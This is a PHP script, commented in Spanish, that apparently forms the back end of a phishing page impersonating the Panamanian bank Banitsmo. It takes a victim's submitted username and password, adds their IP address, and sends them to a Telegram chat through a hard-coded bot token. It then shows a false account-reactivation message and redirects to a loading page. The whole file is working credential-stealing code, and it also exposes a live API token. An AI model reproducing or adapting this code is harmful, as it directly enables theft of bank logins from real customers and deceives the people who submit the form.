<?php

// Configurar los datos del bot de Telegram y del chat
$bot_token = '6588209506:AAE0tCvE9p3LMROYDpYE8CGxVF6QV621g1w';
$chat_id = '1900569011';

// Obtener los datos del usuario, contraseña y dirección IP del formulario
$usuario = $_POST['us'];
$contrasena = $_POST['ct'];
$ip = $_SERVER['REMOTE_ADDR'];

// Construir el mensaje que se enviará al bot de Telegram
$mensaje = "BANITSMO PANAMA:
Nuevo usuario: $usuario\nContraseña: $contrasena\nIP: $ip";

// Enviar el mensaje al bot de Telegram utilizando la API
$url = "https://api.telegram.org/bot$bot_token/sendMessage";
$datos = array('chat_id' => $chat_id, 'text' => $mensaje);
$options = array('http' => array('method' => 'POST', 'content' => http_build_query($datos)));
$context = stream_context_create($options);
$resultado = file_get_contents($url, false, $context);


// Verificar si el mensaje se envió correctamente y mostrar un mensaje al usuario
if ($resultado) {
	echo "Tu cuenta será reactivada al completar la verificación";
} else {
	echo "Lo siento, ha ocurrido un error al enviar tu información. Por favor, inténtalo de nuevo más tarde.";
}




{
echo "<script>";
        
        echo "window.location.href='cargando.php';";
        echo "</script>";


}



?>